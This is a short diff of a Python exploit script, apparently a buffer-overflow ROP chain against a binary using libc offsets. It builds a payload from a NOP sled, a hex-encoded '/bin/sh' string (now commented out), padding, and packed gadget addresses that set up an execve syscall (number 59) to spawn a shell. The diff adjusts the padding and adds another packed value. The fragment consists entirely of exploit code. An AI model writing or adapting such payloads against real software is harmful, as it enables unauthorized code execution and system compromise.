@@ -28,9 +28,10 @@ g6 = LIBC_OFFSET + 0x132bae +0xe #syscall +0xe
 shellcode =''
 for i in range(1,36) :
     shellcode += '\x90'
-shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
+# shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
 # shellcode += struct.pack('<p',"'/bin/sh',0")
-shellcode += 'A'*(1000)
+shellcode += struct.pack('<q', d6)
+shellcode += 'A'*(1004)
 shellcode += struct.pack('<q', g1)#pop rax ; ret
 shellcode += struct.pack('<q', d1) #59
 shellcode += struct.pack('<q', g2)#pop rdx + rsi
